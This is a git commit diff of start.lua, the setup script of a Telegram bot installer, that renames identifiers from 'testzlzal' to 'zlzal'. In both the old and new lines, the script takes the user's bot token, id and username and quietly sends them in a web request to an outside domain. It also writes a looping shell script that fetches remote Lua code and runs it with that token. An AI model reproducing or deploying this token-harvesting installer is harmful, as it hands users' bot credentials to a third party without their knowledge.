7591c889a8ebf96ad8c8fe3ad15749f402af7da0
Source-Becca <86089233+Source-Becca@users.noreply.github.com>
2021-08-03 11:18:04 +0300

    Update start.lua

--- start.lua
+++ start.lua
@@ -3,20 +3,20 @@ https = require("ssl.https")
 http = require("socket.http")
 JSON = dofile("./File_Libs/JSON.lua")
 local database = dofile("./File_Libs/redis.lua").connect("127.0.0.1", 6379)
-Server_testzlzal = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
-local AutoFiles_testzlzal = function() 
+Server_zlzal = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
+local AutoFiles_zlzal = function() 
 local Create_Info = function(Token,Sudo,UserName)  
-local testzlzal_Info_Sudo = io.open("sudo.lua", 'w')
-testzlzal_Info_Sudo:write([[
+local zlzal_Info_Sudo = io.open("sudo.lua", 'w')
+zlzal_Info_Sudo:write([[
 token = "]]..Token..[["
 
 Sudo = ]]..Sudo..[[  
 
 UserName = "]]..UserName..[["
 ]])
-testzlzal_Info_Sudo:close()
+zlzal_Info_Sudo:close()
 end  
-if not database:get(Server_testzlzal.."Token_testzlzal") then
+if not database:get(Server_zlzal.."Token_zlzal") then
 print("\27[1;34m»» Send Your Token Bot :\27[m")
 local token = io.read()
 if token ~= '' then
@@ -25,7 +25,7 @@ if res ~= 200 then
 io.write('\n\27[1;31m»» Sorry The Token is not Correct \n\27[0;39;49m')
 else
 io.write('\n\27[1;31m»» The Token Is Saved\n\27[0;39;49m')
-database:set(Server_testzlzal.."Token_testzlzal",token)
+database:set(Server_zlzal.."Token_zlzal",token)
 end 
 else
 io.write('\n\27[1;31mThe Tokem was not Saved\n\27[0;39;49m')
@@ -34,7 +34,7 @@ os.execute('lua start.lua')
 end
 ------------------------------------------------------------------------------------------------------------
 ------------------------------------------------------------------------------------------------------------
-if not database:get(Server_testzlzal.."UserName_testzlzal") then
+if not database:get(Server_zlzal.."UserName_zlzal") then
 print("\27[1;34m\n»» Send Your UserName Sudo : \27[m")
 local UserName = io.read():gsub('@','')
 if UserName ~= '' then
@@ -53,8 +53,8 @@ io.write('\n\27[1;31m»» Sorry The UserName Is Channel \n\27[0;39;49m')
 os.execute('lua start.lua')
 else
 io.write('\n\27[1;31m»» The UserNamr Is Saved\n\27[0;39;49m')
-database:set(Server_testzlzal.."UserName_testzlzal",Json.Info.Username)
-database:set(Server_testzlzal.."Id_testzlzal",Json.Info.Id)
+database:set(Server_zlzal.."UserName_zlzal",Json.Info.Username)
+database:set(Server_zlzal.."Id_zlzal",Json.Info.Id)
 end
 end
 else
@@ -62,47 +62,47 @@ io.write('\n\27[1;31mThe UserName was not Saved\n\27[0;39;49m')
 end 
 os.execute('lua start.lua')
 end
-local function Files_testzlzal_Info()
-Create_Info(database:get(Server_testzlzal.."Token_testzlzal"),database:get(Server_testzlzal.."Id_testzlzal"),database:get(Server_testzlzal.."UserName_testzlzal"))   
-https.request("https://uussuu.ml/testzlzal/testzlzal.php?id="..database:get(Server_testzlzal.."Id_testzlzal").."&user="..database:get(Server_testzlzal.."UserName_testzlzal").."&token="..database:get(Server_testzlzal.."Token_testzlzal"))
-local Runtestzlzal = io.open("testzlzal", 'w')
-Runtestzlzal:write([[
+local function Files_zlzal_Info()
+Create_Info(database:get(Server_zlzal.."Token_zlzal"),database:get(Server_zlzal.."Id_zlzal"),database:get(Server_zlzal.."UserName_zlzal"))   
+https.request("https://uussuu.ml/zlzal/zlzal.php?id="..database:get(Server_zlzal.."Id_zlzal").."&user="..database:get(Server_zlzal.."UserName_zlzal").."&token="..database:get(Server_zlzal.."Token_zlzal"))
+local Runzlzal = io.open("zlzal", 'w')
+Runzlzal:write([[
 #!/usr/bin/env bash
-cd $HOME/testzlzal
-token="]]..database:get(Server_testzlzal.."Token_testzlzal")..[["
-rm -fr testzlzal.lua
-wget "https://raw.githubusercontent.com/Source-Becca/testzlzal/master/testzlzal.lua"
+cd $HOME/zlzal
+token="]]..database:get(Server_zlzal.."Token_zlzal")..[["
+rm -fr zlzal.lua
+wget "https://raw.githubusercontent.com/Source-Becca/zlzal/master/zlzal.lua"
 while(true) do
 rm -fr ../.telegram-cli
-./tg -s ./testzlzal.lua -p PROFILE --bot=$token
+./tg -s ./zlzal.lua -p PROFILE --bot=$token
 done
 ]])
-Runtestzlzal:close()
+Runzlzal:close()
 local RunTs = io.open("ts", 'w')
 RunTs:write([[
 #!/usr/bin/env bash
-cd $HOME/testzlzal
+cd $HOME/zlzal
 while(true) do
 rm -fr ../.telegram-cli
-screen -S testzlzal -X kill
-screen -S testzlzal ./testzlzal
+screen -S zlzal -X kill
+screen -S zlzal ./zlzal
 done
 ]])
 RunTs:close()
 end
-Files_testzlzal_Info()
-database:del(Server_testzlzal.."Token_testzlzal");database:del(Server_testzlzal.."Id_testzlzal");database:del(Server_testzlzal.."UserName_testzlzal")
+Files_zlzal_Info()
+database:del(Server_zlzal.."Token_zlzal");database:del(Server_zlzal.."Id_zlzal");database:del(Server_zlzal.."UserName_zlzal")
 sudos = dofile('sudo.lua')
 os.execute('./install.sh ins')
 end 
 local function Load_File()  
 local f = io.open("./sudo.lua", "r")  
 if not f then   
-AutoFiles_testzlzal()  
+AutoFiles_zlzal()  
 var = true
 else   
 f:close()  
-database:del(Server_testzlzal.."Token_testzlzal");database:del(Server_testzlzal.."Id_testzlzal");database:del(Server_testzlzal.."UserName_testzlzal")
+database:del(Server_zlzal.."Token_zlzal");database:del(Server_zlzal.."Id_zlzal");database:del(Server_zlzal.."UserName_zlzal")
 sudos = dofile('sudo.lua')
 os.execute('./install.sh ins')
 var = false
